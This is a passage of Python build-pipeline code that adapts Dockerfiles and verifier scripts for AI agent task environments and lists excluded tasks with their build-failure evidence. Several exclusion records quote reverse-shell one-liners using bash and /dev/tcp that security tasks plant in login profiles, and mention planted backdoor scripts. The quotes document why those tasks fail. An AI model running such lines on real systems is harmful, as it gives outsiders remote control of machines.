            return text, 0, "unsupported COPY or ADD form"
        count += 1
    if not count:
        return text, 0, None
    while output and not output[-1].strip():
        output.pop()
    if output[-1].rstrip().endswith("\\"):
        return text, 0, "Dockerfile ends inside a continued instruction"
    if output[-2:] != REMOVE_STAGING[1:-1]:
        output += REMOVE_STAGING[:-1]
    return "\n".join(output + [""]), count, None


def wrap_private_tmp(text):
    """R14, second part: run every shell-form RUN with the staged directories mounted on /tmp and /var/tmp."""
    lines = text.split("\n")
    output = []
    directories = " ".join(PRIVATE_TMP.values())
    mounts = " && ".join(f"mount --bind {staged} {path}" for path, staged in PRIVATE_TMP.items())
    for first, last in logical_instructions(lines):
        logical = "\n".join(lines[first:last + 1])
        match = RUN_LINE.match(logical)
        command = match["cmd"] if match else ""
        if not match or command.startswith(("[", "--")) or command.rstrip().endswith(f"rm -rf {STAGING}"):
            output.extend(lines[first:last + 1])
            continue
        # One line, joined as the builder joins continuations.
        command = " ".join(part.strip()[:-1].rstrip() if part.strip().endswith("\\") else part.strip()
                           for part in command.split("\n"))
        inner = shlex.quote(mounts + ' && exec /bin/sh -c "$1"')
        output.append(f"{match['head']}mkdir -p {directories} && chmod 1777 {directories} && unshare -m /bin/sh -c "
                      f"{inner} sh {shlex.quote(command)}")
    return "\n".join(output)


# ---- build inputs copied to /tmp (R4) -----------------------------------------------------------

TMP_DESTINATION = re.compile(r"^(?P<root>(?:/var)?/tmp)(?:/(?P<rest>.*))?$")
COMMAND_SEPARATOR = re.compile(r"&&|\|\||[;\n|]")


def tmp_reference(prefix):
    """Match `prefix` as a whole path or as the leading directories of a longer one."""
    return re.compile(r"(?<![\w./$}-])" + re.escape(prefix) + r"(?![\w-]|\.\w)")


def removes(command, prefix):
    """True if an `rm` in the RUN command names `prefix` or a glob in the same directory matching it."""
    for segment in COMMAND_SEPARATOR.split(RUN_LINE.match(command)["cmd"]):
        words = segment.replace("\\\n", " ").split()
        if words[:1] == ["rm"] and any(
                fnmatch.fnmatchcase(prefix, word.strip("\"'").rstrip("/")) for word in words[1:]
                if not word.startswith("-") and posixpath.dirname(word.strip("\"'").rstrip("/")) == posixpath.dirname(prefix)):
            return True
    return False


def stage_tmp_copies(text, directories, other_texts):
    """Return (new_text, staged_prefixes, reason_not_applied).

    A COPY destination below /tmp or /var/tmp moves to STAGING + destination when every such file is an
    input of RUN steps and nothing else in the task names it. The same replacement is made in the RUN
    steps, so they read, execute and delete the staged copy. Files below /var/tmp must be deleted by a
    RUN step. Files below /tmp need not be: task containers always start with an empty /tmp, so removing
    the staging directory at the end leaves the same files visible as the upstream image does there.
    """
    lines = text.split("\n")
    instructions = [(i, j, "\n".join(lines[i:j + 1])) for i, j in logical_instructions(lines)]
    copies = {}
    for index, (i, j, logical) in enumerate(instructions):
        words = flatten(logical).split()
        if not words or words[0].upper() not in ("COPY", "ADD") or not TMP_DESTINATION.match(words[-1]):
            continue
        if words[0].upper() == "ADD" or len(words) < 3 or any(word.startswith(("--", "[")) for word in words[1:]):
            return text, [], "unsupported COPY or ADD form"
        copies[index] = words[1:]
    if not copies:
        return text, [], None
    if "<<" in text or len([1 for _, _, logical in instructions if FROM_LINE.match(logical)]) != 1:
        return text, [], "heredoc or several build stages"
    prefixes, replacement = {}, {}
    for index, (*sources, destination) in copies.items():
        staged = []
        for source in sources:
            path = posixpath.normpath(source)
            if re.search(r"[*?\[$]", source) or path.startswith(("/", "..")):
                return text, [], "unsupported COPY source"
            is_directory = path in directories
            match = TMP_DESTINATION.match(destination)
            if is_directory or not (destination.endswith("/") or match["rest"] is None):
                target = destination.rstrip("/")
            else:
                target = destination.rstrip("/") + "/" + posixpath.basename(path)
            match = TMP_DESTINATION.match(target)
            if not match["rest"]:
                return text, [], "COPY of a directory onto /tmp itself"
            prefixes[match["root"] + "/" + match["rest"].split("/")[0]] = True
            staged.append(f"COPY {source} {STAGING}{target}{'/' if is_directory else ''}")
        replacement[index] = staged
    runs = [logical for _, _, logical in instructions if RUN_LINE.match(logical)]
    for prefix in prefixes:
        pattern = tmp_reference(prefix)
        if any(pattern.search(logical) for k, (_, _, logical) in enumerate(instructions)
               if k not in copies and not RUN_LINE.match(logical)):
            return text, [], "path used outside RUN steps"
        if any(pattern.search(other) for other in other_texts):
            return text, [], "path named in task files"
        if not any(pattern.search(command) for command in runs):
            return text, [], "copied file is not used by a RUN step"
        if prefix.startswith("/var/tmp/") and not any(removes(command, prefix) for command in runs):
            return text, [], "file below /var/tmp is not deleted by a RUN step"
    output = []
    for index, (i, j, logical) in enumerate(instructions):
        if index in replacement:
            output.extend(replacement[index])
            continue
        if RUN_LINE.match(logical):
            for prefix in prefixes:
                logical = tmp_reference(prefix).sub(STAGING + prefix, logical)
        output.extend(logical.split("\n"))
    while output and not output[-1].strip():
        output.pop()
    if output[-1].rstrip().endswith("\\"):
        return text, [], "Dockerfile ends inside a continued instruction"
    output += REMOVE_STAGING
    return "\n".join(output), sorted(prefixes), None


# ---- instruction rule (R3) ---------------------------------------------------------------------

def patch_instruction(text):
    """Rewrite ./name after a `cd <abs>` inside one fenced block. Returns (new_text, rewrites)."""
    lines = text.split("\n")
    in_block, cwd, count = False, None, 0
    for index, line in enumerate(lines):
        if line.lstrip().startswith("```"):
            in_block, cwd = not in_block, None
            continue
        if not in_block:
            continue
        pieces = re.split(r"(\s*(?:&&|;)\s*)", line)
        for k in range(0, len(pieces), 2):
            segment = pieces[k].strip()
            cd = CD_SEGMENT.match(segment)
            if cd:
                cwd = cd.group(1).rstrip("/") or "/"
            elif re.match(r"cd(\s|$)", segment):
                cwd = None
            elif cwd and cwd != "/":
                pieces[k], n = DOT_SLASH_TOKEN.subn(cwd + "/", pieces[k])
                count += n
        lines[index] = "".join(pieces)
    return "\n".join(lines), count


# ---- verifier preparation (B1, B2) -------------------------------------------------------------

STATE_LINE = re.compile(r"^(?:set [-+][A-Za-z]+(?: -o pipefail)?|set -o pipefail|export DEBIAN_FRONTEND=noninteractive)$")
PWD_CHECK = re.compile(r'^if \[ "\$PWD" = "/" \]; then$')
PWD_CHECK_BODY = re.compile(r"^(?:echo [^;&|`]*|exit 1)$")
APT = r"(?:DEBIAN_FRONTEND=noninteractive )?apt(?:-get)? (?:-[\w=:.-]+ )*(?:update|install)(?: [\w.+:=-]+)*"
PIP_REQUIREMENT = r"[A-Za-z0-9][\w.\[\],-]*(?:(?:==|>=|<=|~=|!=|<|>)[\w.*]+)*"
PIP = (r"(?:pip3?|python3? -m pip) install"
       rf"(?: (?:--?[A-Za-z][\w-]*|{PIP_REQUIREMENT}|\"{PIP_REQUIREMENT}\"|'{PIP_REQUIREMENT}'))+")
UV_INSTALLER = r"curl -LsSf https://astral\.sh/uv/[\w.]+/install\.sh \| sh"
INSTALL_COMMAND = re.compile(rf"^(?:{APT}|{PIP}|{UV_INSTALLER}|update-ca-certificates)$")
QUIET_SUFFIX = re.compile(r"(?:\s+(?:>|1>|2>|&>)\s*/dev/null|\s+2>&1|\s+\|\|\s+true)+$")
UV_INSTALLER_URL = re.compile(r"https://astral\.sh/uv/[\w.]+/install\.sh")
LITERAL_ASSIGNMENT = re.compile(r'^(?:readonly )?(\w+)="([^"$`\\]*)"$', re.M)
# Templates that install uv only when `uvx` is not found. They stay unsplit: with uv in the image their
# own guard skips the installation.
UVX_GUARDS = ('CF_UVX_BIN="$(command -v uvx 2>/dev/null || true)"\nif [[ -z "${CF_UVX_BIN}" ]]; then\n',
              "ensure_uv() {\n  if command -v uvx >/dev/null 2>&1; then\n    return 0\n  fi\n")
NETWORK_INSTALL = re.compile(r"\bapt(?:-get)?\b[^\n]*\binstall\b|\bpip3?\b[^\n]*\binstall\b|\buv (?:pip|venv|tool)\b"
                             r"|astral\.sh/uv|\b(?:curl|wget)\b[^\n]*https?://")
PREPARATION_ONLY = re.compile(rf"^(?:{UV_INSTALLER}|update-ca-certificates"
                              r"|apt(?:-get)? update|apt(?:-get)? install -y(?: curl| ca-certificates)+)$")


UV_ENV_STEP = '. "$HOME/.local/bin/env" && '
# The image has curl but no CA bundle, so the verifier's own `curl https://astral.sh/uv/...` ends with
# error 77 and installs nothing (image prebuild jobs 995600 and 999745, image-build-logs/<key>.build.log).
# The layer then holds the script's installation commands, which tolerate that, without the test-runner
# warm-up.
NO_CA_BUNDLE = {
    "contrastive_solver-software-engineering_20260510_062946_002": "shards/0000 image-build-logs/48629c5bc627.build.log",
    "contrastive_solver-security_20260501_172213_002": "shards/0004 image-build-logs/57d0779b137d.build.log",
    "contrastive_solver-system-administration_20260510_062946_002": "job 999745 shards/0011 image-build-logs/8a0e2dc2245b.build.log",
}
# Not built in job 999745 (Docker Hub pull limit). As in the tasks above, the Dockerfile installs curl with
# --no-install-recommends and the verifier installs only curl, so nothing brings ca-certificates. Each
# patched task was built with the shared builder on the Helma login node on 2026-10-13; the layer's curl
# ended with error 77. Logs: generation-0008/image-prebuild/agent-attempt-0006/agents/fixer/
# local-builds.tar.gz, member <task>/build.log.
LOCAL_NO_CA_BUNDLE = (
    "contrastive_solver-software-engineering_20260514_011125_002",
    "contrastive_solver-system-administration_20260508_153434_002",
)
NO_CA_BUNDLE.update((_task, f"local-builds.tar.gz {_task}/build.log") for _task in LOCAL_NO_CA_BUNDLE)


def flatten(command):
    return " ".join(command.replace("\\\n", " ").split())


def is_install(command):
    parts = [QUIET_SUFFIX.sub("", part.strip()) for part in flatten(command).split("&&")]
    return all(INSTALL_COMMAND.match(part) for part in parts)


def split_verifier(text):
    """Return (setup_text, test_text, moved_commands, errexit) or None.

    Only a maximal run of installation commands is moved. It may be preceded by shell options (copied to
    setup.sh), `mkdir -p /logs/verifier` and the template's working-directory check, which do not depend
    on the installation. Everything else stays in test.sh in its original order.
    """
    lines = text.split("\n")
    start = 1 if lines[0].startswith("#!") else 0
    state, commands, first, last, skip = [], [], None, None, -1
    for i, j in logical_instructions(lines):
        if i < start or i <= skip:
            continue
        command = "\n".join(lines[i:j + 1]).strip()
        if not command or command.startswith("#"):
            continue
        if is_install(command):
            first = i if first is None else first
            last = j
            commands.append(flatten(command))
            continue
        if first is not None:
            break
        if STATE_LINE.match(command):
            state.append(command)
        elif command == "mkdir -p /logs/verifier":
            pass
        elif PWD_CHECK.match(command):
            end = next((k for k in range(i + 1, len(lines)) if lines[k].strip() == "fi"), None)
            if end is None or not all(PWD_CHECK_BODY.match(line.strip()) for line in lines[i + 1:end]):
                break
            skip = end
        else:
            break
    if first is None:
        return None
    # Comments directly above the first moved command describe it and move with it.
    while first - 1 >= start and lines[first - 1].lstrip().startswith("#"):
        first -= 1
    setup = lines[:start] + state + lines[first:last + 1]
    test = lines[:first] + lines[last + 1:]
    errexit = any(re.match(r"set -[A-Za-z]*e", line) for line in state)
    return "\n".join(setup) + "\n", "\n".join(test), commands, errexit


def uvx_warmup(text):
    """Return (`uvx <options> pytest --version`, unpinned requirements) for the script's single uvx call."""
    variables = dict(LITERAL_ASSIGNMENT.findall(text))
    lines = text.split("\n")
    found = set()
    for i, j in logical_instructions(lines):
        command = flatten("\n".join(lines[i:j + 1]))
        if not re.match(r'(?:uvx|\$HOME/\.local/bin/uvx|"\$\{CF_UVX_BIN\}") ', command):
            continue
        command = re.sub(r"\$\{(\w+)\}", lambda m: variables.get(m.group(1), m.group(0)), command)
        try:
            tokens = shlex.split(command)[1:]
        except ValueError:
            return None
        if "pytest" not in tokens:
            return None
        options = tuple(tokens[:tokens.index("pytest")])
        if any(re.search(r"[$`]", option) for option in options):
            return None  # depends on a shell value this function does not resolve
        found.add(options)
    if len(found) != 1:
        return None
    options = found.pop()
    requirements = [options[k + 1] for k in range(len(options) - 1) if options[k] in ("-w", "--with")]
    return (" ".join(["uvx", *map(shlex.quote, options), "pytest", "--version"]),
            [item for item in requirements if "==" not in item])


def plan_verifier(text):
    """Derive the B1 image layer and the B2 split from one upstream tests/test.sh."""
    plan = {"layer": None, "setup": None, "test": None, "kind": None, "unpinned": [], "agent_visible": []}
    split = split_verifier(text)
    steps = "export HOME=/root DEBIAN_FRONTEND=noninteractive"
    if split:
        setup, test, commands, errexit = split
        plan.update(setup=setup, test=test, kind="split")
        # Without `set -e` the script continues after a failed installation command; the layer does too.
        # setup.sh repeats the commands at verification, so the layer only saves time.
        steps += "".join(f" && {command}" if errexit else f"; {{ {command}; }} || true" for command in commands)
        plan["agent_visible"] = [command for command in commands
                                 if not PREPARATION_ONLY.match(QUIET_SUFFIX.sub("", command))]
        warm = uvx_warmup(test) if any(re.fullmatch(UV_INSTALLER, command) for command in commands) else None
        if warm:
            steps += f'; {UV_ENV_STEP}{warm[0]}'
    elif any(guard in text for guard in UVX_GUARDS):
        warm, url = uvx_warmup(text), set(UV_INSTALLER_URL.findall(text))
        if not warm or len(url) != 1:
            return plan
        plan["kind"] = "guarded"
        steps += ('; export PATH="/root/.local/bin:$PATH"; if ! command -v uvx >/dev/null 2>&1; then '
                  "if ! command -v curl >/dev/null 2>&1; then apt-get update && "
                  "apt-get install -y --no-install-recommends ca-certificates curl; fi; "
                  f"curl -LsSf {url.pop()} | sh; fi; {warm[0]}")
    else:
        return plan
    if warm:
        plan["unpinned"] = warm[1]
    plan["layer"] = f"RUN {steps}\n"
    return plan


# ---- shared images (A) -------------------------------------------------------------------------

def normalized_dockerfile(text):
    """Dockerfile without top-level comments, blank lines and trailing whitespace; None if unsafe."""
    if "<<" in text or "\r" in text or re.search(r"^\s*#\s*(?:syntax|escape|check)\s*=", text, re.M | re.I):
        return None
    kept, continued = [], False
    for line in text.split("\n"):
        line = line.rstrip()
        if not continued and (not line or line.lstrip().startswith("#")):
            if line.endswith("\\"):
                return None  # the Apptainer builder would join this comment with the next line
            continue
        kept.append(line)
        continued = line.endswith("\\")
    return None if continued else "\n".join(kept)


def plan_shared_dockerfiles(files):
    """First pass over the upstream bytes: {task_id: (canonical_task_id, canonical_dockerfile)}."""
    groups = {}
    for path in files:
        for batch in pq.ParquetFile(path).iter_batches(batch_size=64):
            table = batch.to_pydict()
            for task_id, binary in zip(table["path"], table["task_binary"]):
                if task_id in DROPPED:
                    continue
                context, dockerfile, verifier = [], None, ""
                for info, data in read_task(binary):
                    if info.name == "environment/Dockerfile":
                        dockerfile = data.decode("utf-8")
                    elif info.name.startswith("environment/") and not info.isdir():
                        context.append((info.name, info.type.decode(), info.mode,
                                        sha256(data) if data is not None else info.linkname))
                    elif info.name == "tests/test.sh":
                        verifier = data.decode("utf-8")
                normalized = normalized_dockerfile(dockerfile) if dockerfile is not None else None
                if normalized is None:
                    continue
                # Tasks merge only when the appended verifier layer (B1) is identical as well.
                key = sha256(json.dumps([sorted(context), normalized, plan_verifier(verifier)["layer"]]).encode())
                groups.setdefault(key, []).append((task_id, dockerfile))
    shared = {}
    for members in groups.values():
        if len({dockerfile for _, dockerfile in members}) > 1:
            canonical = min(members)
            shared.update({task_id: canonical for task_id, _ in members})
    return shared


# ---- exclusions (X) ----------------------------------------------------------------------------

# Stage 3, job 960492 (generation-0003/stage3-200), image-build-logs/a19245280caa.build.log: the step
# `service postgresql start && sleep 2 && /app/init_db.sh && service postgresql stop` ends with
# "Error: Data directory /var/lib/postgresql/16/main must not be owned by root" in all six builds.
DROPPED = {
    "contrastive_solver-system-administration_20260514_011856_002": {
        "category": "backend_build_ownership",
        "reason": "The Dockerfile starts PostgreSQL and creates the task's database while the image is built. "
                  "PostgreSQL only runs under its own unprivileged account, and the rootless Apptainer build has "
                  "a single user ID, so every file belongs to root: all six build attempts of stage 3 job 960492 "
                  "stopped with 'Data directory /var/lib/postgresql/16/main must not be owned by root' "
                  "(image-build-logs/a19245280caa.build.log). The published upstream image does not help, because "
                  "importing it without privileges loses the postgres ownership as well, and the task itself "
                  "requires the database to run. Leaving the step out would change the environment.",
    },
}

# Image prebuild job 995600 (generation-0007/image-prebuild/array/shards/<shard>/evidence.tar.gz, member
# image-build-logs/<key>.build.log): the build step that starts the server ends with the quoted message.
SERVER_STEP_FAILURES = {
    "contrastive_solver-system-administration_20260422_235124_004": ("0000", "0a4c80c0bdc6", "Data directory /var/lib/postgresql/16/main must not be owned by root"),
    "contrastive_solver-system-administration_20260501_000112_003": ("0002", "f06021a3f599", "pg_ctl: cannot be run as root"),
    "contrastive_solver-system-administration_20260503_030115_008": ("0022", "0e005a921116", "initdb: error: cannot be run as root"),
    "contrastive_solver-system-administration_20260510_062946_001": ("0003", "244206919646", "initdb: error: cannot be run as root"),
    "contrastive_solver-system-administration_20260513_204848_005": ("0015", "dcff42ee9327", "pg_ctl: cannot be run as root"),
    "contrastive_solver-system-administration_20260601_053159_004": ("0002", "e384d12eb25d", "pg_ctl: cannot be run as root ... Could not start cluster"),
    "contrastive_solver-system-administration_20260603_181444_003": ("0019", "e8b8afd5ba59", "pg_ctl: cannot be run as root"),
    "contrastive_solver-system-administration_20260604_144210_003": ("0007", "495b27f8de0a", "pg_ctl: cannot be run as root"),
    "contrastive_solver-system-administration_20260606_153537_005": ("0024", "dcf1d46ff739", "Starting OpenLDAP slapd ...fail!"),
    "contrastive_solver-system-administration_20260606_172622_006": ("0021", "c96dbb2d7c94", "pg_ctl: cannot be run as root"),
    "contrastive_solver-system-administration_20260615_143956_004": ("0000", "c48dd27a2298", "pg_ctl: cannot be run as root"),
    "contrastive_solver-system-administration_20260617_051646_003": ("0017", "3e9f425cbb67", "pg_ctl: cannot be run as root"),
    "contrastive_solver-system-administration_20260617_051646_005": ("0018", "84766e48958c", "Starting OpenLDAP slapd ...fail!"),
    "multi_solver-system-administration_20260409_023346_002": ("0010", "8ed3beaf7853", "Data directory /var/lib/postgresql/16/main must not be owned by root"),
}
# Image prebuild job 999745 (generation-0008/image-prebuild/array/shards/<shard>/evidence.tar.gz), the same
# step. These Dockerfiles start the server from a script in the build context rather than in a RUN line.
SERVER_STEP_FAILURES_999745 = {
    "contrastive_solver-system-administration_20260513_204536_001": ("0016", "9fc09aa9fd32", "pg_ctl: cannot be run as root"),
    "multi_solver-system-administration_20260414_211532_002": ("0011", "9dca0d595ada", "Data directory /var/lib/postgresql/16/main must not be owned by root"),
    "multi_solver-system-administration_20260419_065313_004": ("0011", "56d8176d90c1", "Data directory /var/lib/postgresql/16/main must not be owned by root"),
    "multi_solver-system-administration_20260421_155939_001": ("0001", "111da0e9a7a6", "initdb: error: cannot be run as root"),
}
# Not built in job 995600 (Docker Hub pull limit, node scratch) or stopped there before the server step.
# Each patched task was built with the shared builder (python -m hpc.offline_prep.image_cache --build) on the Helma
# login node on 2026-10-13; the step that starts or initializes the server ended with the quoted message.
# Logs: generation-0007/image-prebuild/agent-attempt-0006/agents/fixer/local-builds.tar.gz, member
# <task>/build.log.
LOCAL_SERVER_STEP_FAILURES = {
    "contrastive_solver-system-administration_20260420_020307_007": "Data directory /var/lib/postgresql/16/main must not be owned by root",
    "contrastive_solver-system-administration_20260427_204204_006": "pg_ctl: cannot be run as root",
    "contrastive_solver-system-administration_20260430_081156_001": "Data directory /var/lib/postgresql/16/main must not be owned by root",
    "contrastive_solver-system-administration_20260501_051538_004": "Data directory /var/lib/postgresql/16/main must not be owned by root",
    "contrastive_solver-system-administration_20260502_090008_007": "pg_ctl: cannot be run as root",
    "contrastive_solver-system-administration_20260503_182123_006": "Data directory /var/lib/postgresql/16/main must not be owned by root",
    "contrastive_solver-system-administration_20260506_213248_002": "Data directory /var/lib/postgresql/16/main must not be owned by root",
    "contrastive_solver-system-administration_20260506_213248_003": "Data directory /var/lib/postgresql/16/main must not be owned by root",
    "contrastive_solver-system-administration_20260507_170244_004": "Data directory /var/lib/postgresql/16/main must not be owned by root",
    "contrastive_solver-system-administration_20260508_045800_004": "Data directory /var/lib/postgresql/16/main must not be owned by root",
    "contrastive_solver-system-administration_20260508_153434_004": "initdb: error: cannot be run as root",
    "contrastive_solver-system-administration_20260510_125534_004": "Data directory /var/lib/postgresql/16/main must not be owned by root",
    "contrastive_solver-system-administration_20260511_015840_001": "pg_ctl: cannot be run as root",
    "contrastive_solver-system-administration_20260511_015840_002": "initdb: error: cannot be run as root",
    "contrastive_solver-system-administration_20260528_174918_003": "pg_ctl: cannot be run as root",
    "contrastive_solver-system-administration_20260601_053159_002": "initdb: error: cannot be run as root",
    "contrastive_solver-system-administration_20260604_144210_005": "initdb: error: cannot be run as root",
    "multi_solver-system-administration_20260414_211532_004": "pg_ctl: cannot be run as root",
    "multi_solver-system-administration_20260415_094424_001": "initdb: error: cannot be run as root",
    "multi_solver-system-administration_20260415_182321_001": "pg_ctl: cannot be run as root",
    "multi_solver-system-administration_20260416_031414_002": "Data directory /var/lib/postgresql/16/main must not be owned by root",
    "multi_solver-system-administration_20260416_172928_004": "initdb: error: cannot be run as root",
    "multi_solver-system-administration_20260416_184513_006": "pg_ctl: cannot be run as root",
    "multi_solver-system-administration_20260418_044216_007": "initdb: error: cannot be run as root",
}
# Not built in job 999745 either; built the same way on 2026-10-13 after that job. Logs:
# generation-0008/image-prebuild/agent-attempt-0006/agents/fixer/local-builds.tar.gz, member <task>/build.log.
LOCAL_SERVER_STEP_FAILURES_GENERATION_8 = {
    "contrastive_solver-system-administration_20260424_090344_004": "Data directory /var/lib/postgresql/16/main must not be owned by root",
    "multi_solver-system-administration_20260413_173854_007": "Data directory /var/lib/postgresql/16/main must not be owned by root",
}
# Image prebuild job 1001178 (generation-0009/image-prebuild/array/shards/0004/evidence.tar.gz, member
# image-build-logs/0ea98f40e472.build.log): the RUN step `... && nginx -t && ...` prints "syntax is ok" and
# then "nginx: [emerg] bind() to 0.0.0.0:80 failed (13: Permission denied)" in all six builds.
# Image prebuild job 1003442 (generation-0010/image-prebuild/array/shards/0006/evidence.tar.gz, member
# image-build-logs/4ca0b07ac309.build.log): the RUN step `... && bash /app/setup.sh && ...` ends with the same
# two lines in all six builds; environment/files/setup.sh runs `nginx -t` and then `nginx`.
PRIVILEGED_PORT_STEP_FAILURES = {
    "contrastive_solver-system-administration_20260509_065529_008": (
        "1001178", "0004", "0ea98f40e472", "nginx: [emerg] bind() to 0.0.0.0:80 failed (13: Permission denied)",
        "The Dockerfile tests the nginx configuration while the image is built, and the test binds",
        "tests/test_outputs.py requests http://127.0.0.1/health and http://127.0.0.1/api/data through nginx on "
        "port 80"),
    "contrastive_solver-security_20260510_053611_007": (
        "1003442", "0006", "4ca0b07ac309", "nginx: [emerg] bind() to 0.0.0.0:80 failed (13: Permission denied)",
        "The Dockerfile runs environment/files/setup.sh while the image is built; the script tests the nginx "
        "configuration and starts nginx, and both bind",
        "tests/test.sh starts nginx with the same configuration and tests/test_outputs.py requests "
        "http://localhost/css../config.json and the other locations on port 80"),
}
# Files the Dockerfile places below /tmp or /var/tmp and the task file that depends on them.
TEMPORARY_DIRECTORY_STATE = {
    "contrastive_solver-security_20260424_090344_005": (
        "/tmp/exploit_root and /var/tmp/chroot", "tests/test_outputs.py expects the report to name "
        "/tmp/exploit_root/etc/nsswitch.conf and /var/tmp/chroot/etc/nsswitch.conf"),
    "contrastive_solver-security_20260501_051538_007": (
        "/tmp/.update.sh", "instruction.md directs the investigation to /tmp/ and tests/test_outputs.py looks for "
        ".update.sh in the findings; build log shards/0002 image-build-logs/9c18aea3816d.build.log"),
    "contrastive_solver-security_20260604_003113_004": (
        "/tmp/.syslogd", "tests/test_outputs.py asserts that the reverse shell /tmp/.syslogd was removed"),
    "contrastive_solver-security_20260614_141608_007": (
        "/var/tmp/.cache", "tests/test_outputs.py checks the handling of /var/tmp/.cache; build log shards/0011 "
        "image-build-logs/54858499251f.build.log"),
    "contrastive_solver-security_20260615_143956_007": (
        "/var/tmp/.cache", "tests/test_outputs.py uses HIDDEN_DIR = /var/tmp/.cache; build log shards/0020 "
        "image-build-logs/cb002b690990.build.log"),
    "contrastive_solver-security_20260617_051646_007": (
        "/var/tmp/.cache/net-diag.sh", "tests/test_outputs.py uses BACKDOOR_SCRIPT = /var/tmp/.cache/net-diag.sh; "
        "build log shards/0002 image-build-logs/63cd2c0e4f49.build.log"),
    "contrastive_solver-system-administration_20260615_143956_002": (
        "/tmp/.hidden", "tests/test_outputs.py asserts that the backdoor directory /tmp/.hidden was removed"),
}
# Stage 3 job 1009236 (generation-0011/stage3-full/array/shards/<shard>/evidence.tar.gz, member
# results/stage_3_build_validation/<run>/<n>-<task>/[retry-<k>/]preparation-review.json): every command run
# in the task container stopped at its limit in all five runs, including `rm -f /tests/setup.sh` (60 s) and
# the agent environment's checks (`pwd`, 30 s, or the 120 s bridge wait). The backend runs each command in a login shell, which sources
# the login profile the task plants; its background job keeps the command's output open.
LOGIN_PROFILE_BACKDOORS = {
    "contrastive_solver-security_20260510_130518_007": (
        "0019", "environment/files/setup.sh writes /etc/profile.d/terminal-setup.sh, which runs "
        "`(nohup bash -i > /dev/tcp/10.20.30.40/4444 0<&1 2>&1 &)` for root"),
    "contrastive_solver-security_20260606_172554_007": (
        "0008", "environment/files/zz-profile-dbus.sh is copied to /etc/profile.d and starts "
        "`/usr/lib/systemd/systemd-fstrim-helper --sync &`, a planted script that sends data to 10.0.1.99:4444"),
    "multi_solver-security_20260414_211453_006": (
        "0005", "the Dockerfile writes /etc/profile.d/bash-opts.sh, which runs "
        "`(nohup bash -i > /dev/tcp/10.45.127.89/4445 0<&1 2>&1 &)` for root"),
}
for _job, _task, (_shard, _key, _message) in (
        *(("995600", *item) for item in SERVER_STEP_FAILURES.items()),
        *(("999745", *item) for item in SERVER_STEP_FAILURES_999745.items())):
    DROPPED[_task] = {
        "category": "backend_build_ownership",
        "reason": "The Dockerfile starts or initializes a database or directory server while the image is built. "
                  "The server only runs under its own unprivileged account, and the rootless Apptainer build has a "
                  f"single user ID: the step stopped with '{_message}' in image prebuild job {_job} "
                  f"(shards/{_shard} image-build-logs/{_key}.build.log). Task containers have the same single user "
                  "ID, so the service the task is about cannot run there either. Leaving the step out would change "
                  "the environment.",
    }
for _generation, _task, _message in (
        *(("generation-0007", *item) for item in LOCAL_SERVER_STEP_FAILURES.items()),
        *(("generation-0008", *item) for item in LOCAL_SERVER_STEP_FAILURES_GENERATION_8.items())):
    DROPPED[_task] = {
        "category": "backend_build_ownership",
        "reason": "The Dockerfile starts or initializes PostgreSQL while the image is built. PostgreSQL only runs "
                  "under its own unprivileged account, and the rootless Apptainer build has a single user ID: the "
                  f"step stopped with '{_message}' when the patched task was built with the shared builder on the "
                  f"Helma login node on 2026-10-13 ({_generation}/image-prebuild/agent-attempt-0006/agents/fixer/"
                  f"local-builds.tar.gz, member {_task}/build.log). Task containers have the same single user ID, "
                  "so the service the task is about cannot run there either. Leaving the step out would change "
                  "the environment.",
    }
for _task, (_job, _shard, _key, _message, _step, _evidence) in PRIVILEGED_PORT_STEP_FAILURES.items():
    DROPPED[_task] = {
        "category": "backend_privileged_port",
        "reason": f"{_step} the "
                  "configured port 80. The rootless Apptainer build runs on the build host's network, where an "
                  f"unprivileged user may not bind ports below 1024: the step stopped with '{_message}' in image "
                  f"prebuild job {_job} (shards/{_shard} image-build-logs/{_key}.build.log), and the cluster does "
                  "not allow a private network namespace for the step. Task containers that use the host network "
                  f"have the same restriction, and {_evidence}. Leaving the step out or changing the port would "
                  "change the environment.",
    }
for _task, (_paths, _evidence) in TEMPORARY_DIRECTORY_STATE.items():
    DROPPED[_task] = {
        "category": "backend_temporary_directories",
        "reason": f"The task's evidence files are placed in {_paths} by the Dockerfile. Apptainer mounts the build "
                  "host's /tmp and /var/tmp over the image while RUN steps execute, and task containers start with "
                  "both directories empty (--containall), so the files cannot be present when the agent starts. "
                  f"{_evidence}. Placing them elsewhere would change the task.",
    }
for _task, (_shard, _backdoor) in LOGIN_PROFILE_BACKDOORS.items():
    DROPPED[_task] = {
        "category": "backend_login_shell",
        "reason": f"The task's subject is a login-shell persistence mechanism: {_backdoor}. The Apptainer backend "
                  "runs every agent and verifier command in a login shell (bash -lc), so the planted job starts "
                  "with each command and keeps its output open while the outbound connection waits. In stage 3 "
                  f"job 1009236 (shards/{_shard} evidence.tar.gz) every command in the task container hit its "
                  "limit in all five runs: `rm -f /tests/setup.sh` took 60 s and the agent environment's "
                  "checks timed out. "
                  "Removing the mechanism would remove what the agent is asked to find.",
    }



# User-requested exclusions: upstream verifier prerequisites are absent and undocumented.
DROPPED['contrastive_solver-system-administration_20260610_111012_001'] = {
    "category": "verifier-missing-python",
    "reason": "Temporarily archived at the user's request: the original upstream Dockerfile uses ubuntu:24.04 without installing Python, while tests/test.sh requires Python and pytest without provisioning them. No-op verification stops with 'no Python interpreter found' before any tests execute. The agent instructions ask for source builds of OpenSSL, libevent and memcached, not installation of Python or pytest. These are undocumented verifier prerequisites, not dependencies the instructions require the agent to supply. Our Dockerfile patches did not remove Python; a runtime using the image without injecting dependencies encounters the same mismatch. Original payload preserved for later repair.",
}

DROPPED['contrastive_solver-software-engineering_20260611_210349_018'] = {
    "category": "verifier-missing-python",
    "reason": "Temporarily archived at the user's request: the original upstream Dockerfile uses ubuntu:24.04 without installing Python, while tests/test.sh requires Python and pytest without provisioning them. No-op verification stops with 'no Python interpreter found' before any tests execute. The agent instructions ask for a C/shell polyglot base64 program using gcc and bash, not installation of Python or pytest. These are undocumented verifier prerequisites, not dependencies the instructions require the agent to supply. Our Dockerfile patches did not remove Python; a runtime using the image without injecting dependencies encounters the same mismatch. Original payload preserved for later repair.",
}

DROPPED['contrastive_solver-security_20260610_111702_002'] = {
    "category": "verifier-missing-python",
